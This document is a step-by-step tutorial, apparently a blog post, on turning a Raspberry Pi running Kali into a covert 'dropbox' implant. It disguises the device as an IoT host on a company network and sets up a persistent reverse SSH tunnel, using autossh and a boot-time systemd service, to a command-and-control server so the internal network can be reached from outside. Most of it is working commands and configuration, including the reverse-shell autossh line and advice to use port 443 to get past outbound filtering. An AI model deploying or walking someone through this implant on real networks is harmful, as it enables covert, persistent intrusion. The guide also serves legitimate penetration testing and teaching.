# How to create a simple Pentesting DropBox using a raspberry pi

Why should I use a Raspberry Pi? The main reason is for its small size. It’s possible to hide it in plain sight and easily disguise it as an IoT device on the network.

Another reason is that most companies’ firewalls will block unauthorized access to it. So if one can smuggle a small device onto its network, it’s possible to get a reverse shell and scan the network from somewhere else.
## How to get pass firewall?

The best possible solution is to get the DropBox inside the network to reach back to a C2 (command and control) server. And reach the DropBox from anywhere using the reverse shell through SSH, using the C2 as a passthrough tunnel.

Raspberry -> reverse SSH -> C2 Server <- SSH <- Attacker machine
> ADD a picture here explaining how is works.

## Kali installation 
### Image download and install
Kali can be installed right from the [Raspberry Pi Imager](https://www.raspberrypi.com/software/) or following the guide on [Kali](https://www.kali.org/docs/arm/raspberry-pi-4/) The Process is really easy.

After installing Kali on the Raspberry Pi, SSH into it. You can find its IP address using your router.
```bash
ssh kali@[kali-IP]
```
The default user and password are `kali:kali`

Update and upgrade 
```bash
sudo apt update && sudo apt full-upgrade
```

**After that, change the default password for the `Kali` user.**

### Minor modifications

The whole idea is to hide in plain sight, so some modifications must be made so the DropBox can disguise as an IoT device.

First, change the hostname in two locations: `/etc/hostname` and `/etc/hosts`. 
Here, anything is valid as long as it looks like it belongs to the company. If you can get the scheme of how the devices are named, it can be easily passed off as just another host.

>On `/etc/hostname`, choose the name you want.
>On `/etc/hosts`, use the same name on the line containing the loopback address (`127.0.1.1`).

After this step, the DropBox will mostly look like it’s just another host on the network. Of course, there are situations when the company adopts MAC-address filtering. And This can be a problem.

At this point, the basic configuration is done on the Raspberry Pi. But we will come back to it soon.

---
## C2 settings

A crucial part of this is the Command and Control server. It’s the middle-man in the communication. The DropBox will try to make contact with it, and when the connection is established, the reverse shell will be accessible.

For this, I decided to use a Ubuntu 22.04 LTS on [Linode](www.linode.com). It's just a basic shared CPU with privet IP.
### SSH configuration
On the file `/etc/ssh/sshd_config`, we have to change three lines:

```bash
AllowTcpForwarding yes
GatewayPorts yes
PasswordAuthentication yes
```
This will enable port forwarding and enable authentication using a password.

After changing the lines, just restart the SSH service.
```bash
sudo service ssh restart
```

### User
A new Ubuntu “linode” installation will have only the root user, so we’ll add a new user.
```bash
adduser [username]
```

After this, the **basic** configuration for the C2 will be ready.

> For a real engagement, it’s recommended to strengthen the security of the C2. **This configuration is just for demonstration.**
 
---

## Create the reverse shell tunnel

At this point, we go back to the Raspberry Pi, and the main idea now is to generate a pair of keys (public and private), so the DropBox can authenticate SSH into the C2 server without a password. For this, we will create an `SSH keypair`.
```bash
ssh-keygen
```
Just generate the keypair; there is no need for a password.

Copy the public key to the C2 server
```bash
ssh-copy-id [username]@[CnC-Server-IP]
```
Provide the password for the user.

After this, it’s not necessary to enter a password to connect to the server.
```bash
ssh [username]@[CnC-Server-IP]
```

### AutoSSH

Install `AutoSSH`. For more info about it see [SSH tunnelling for fun and profit: Autossh (everythingcli.org)](https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-autossh/)

```bash
apt install autossh -y
```

The idea is to automate the SSH tunnel. So when the DropBox is turned on and is plugged into a network, it will automatically connect to the C2, and the reverse shell will be on.

After the installation is complete, we should create a service, so the autossh will start automatically. To create the service, first create the file `/etc/systemd/system/[Some_Cool_Service_Name].service` and add the following to it:
```bash
[Unit]
 Description=/etc/[Same_Cool_Sevice_Name] Compatibility
 ConditionPathExists=/etc/[Same_Cool_Sevice_Name]
[Service]
 Type=forking
 ExecStart=/etc/[Same_Cool_Sevice_Name] start
 TimeoutSec=0
 StandardOutput=tty
 RemainAfterExit=yes
 SysVStartPriority=99
[Install]
 WantedBy=multi-user.target
```

And then the next file `/etc/[Same_Cool_Sevice_Name]`. Add the following:
```bash
#!/bin/bash -e
autossh -M 0 -fN -o "PubkeyAuthentication=yes" -o "StrictHostKeyChecking=false" -o "PasswordAuthentication=no" -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -R 6969:localhost:22 -i /home/kali/.ssh/id_rsa [kali]@[CnC-Server-IP] &
exit 0
```

- The `-M` is the monitoring port. autossh will send test data to check if it is still connected to the server. The autossh manual suggests using `ServerAliveInterval` and `ServerAliveCountMax` on recent versions of OpenSSH. But the monitoring port can be turned off using the value 0.
- The `-f` causes `autossh` to drop to the background before running `ssh`.
- The `-N` tag is for not executing a remote command. 
- Tag `-o` is to specify the options.
- The `-R` option is used to set the remote port. In this case, the Dropbox will be accessible on port 6969. If the organization has strict outbound filtering policies, a good option for this is port 443.
- The `-i` sets the location from where `ssh` will find the privet key.
- And the `&` is to prevent the DropBox to hang at boot.

Make `/etc/[Same_Cool_Sevice_Name]` executable:
```bash
chmod +x /etc/[Same_Cool_Sevice_Name]
```

Enable `[Same_Cool_Sevice_Name].service`

```bash
systemctl enable [Same_Cool_Sevice_Name]
systemctl start [Same_Cool_Sevice_Name].service
```

## Test connection

After plugging the DropBox into a test network, you can check the SSH connection by logging in first from the C2 server:

```bash
ssh kali@localhost -p 6969
```
Enter the password for the `kali` user. Note that the port must be the same one that was set on `autossh`.

Next, you can log in from any other place:

```bash
ssh kali@[CnC-Server-IP] -p 6969
```
